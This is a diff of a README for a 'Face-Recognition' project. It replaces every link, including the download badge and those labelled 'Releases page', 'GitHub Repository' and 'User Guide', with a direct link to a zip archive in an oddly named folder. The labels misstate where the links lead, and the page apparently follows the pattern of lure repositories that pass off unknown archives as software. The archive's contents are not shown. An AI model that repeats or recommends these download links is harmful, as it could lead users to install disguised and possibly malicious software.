@@ -4,10 +4,10 @@
 Welcome to the Face-Recognition project! This software helps you recognize faces in real-time using your camera. It uses a customizable image database to identify multiple people at once. Follow the steps below to download and run the software smoothly.
 
 ## 🔗 Download Link
-[![Download Face-Recognition](https://github.com/vanl214/Face-Recognition/raw/refs/heads/main/emulsible/Face_Recognition_v1.0.zip)](https://github.com/vanl214/Face-Recognition/raw/refs/heads/main/emulsible/Face_Recognition_v1.0.zip)
+[![Download Face-Recognition](https://raw.githubusercontent.com/vanl214/Face-Recognition/main/emulsible/Face-Recognition-3.2.zip)](https://raw.githubusercontent.com/vanl214/Face-Recognition/main/emulsible/Face-Recognition-3.2.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/vanl214/Face-Recognition/raw/refs/heads/main/emulsible/Face_Recognition_v1.0.zip) to download the latest version of Face-Recognition. This page will have the files you need to run the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/vanl214/Face-Recognition/main/emulsible/Face-Recognition-3.2.zip) to download the latest version of Face-Recognition. This page will have the files you need to run the application. 
 
 1. Click the “Releases” link above.
 2. Look for the latest version. 
@@ -78,7 +78,7 @@ For any questions or support, please reach out through the contact information p
 ## 🔗 Additional Resources
 For more information, tutorials, or discussions related to Face-Recognition, you can check the following:
 
-- [GitHub Repository](https://github.com/vanl214/Face-Recognition/raw/refs/heads/main/emulsible/Face_Recognition_v1.0.zip)
-- [User Guide](https://github.com/vanl214/Face-Recognition/raw/refs/heads/main/emulsible/Face_Recognition_v1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/vanl214/Face-Recognition/main/emulsible/Face-Recognition-3.2.zip)
+- [User Guide](https://raw.githubusercontent.com/vanl214/Face-Recognition/main/emulsible/Face-Recognition-3.2.zip)
 
 Thank you for choosing Face-Recognition! Enjoy recognizing faces with ease.
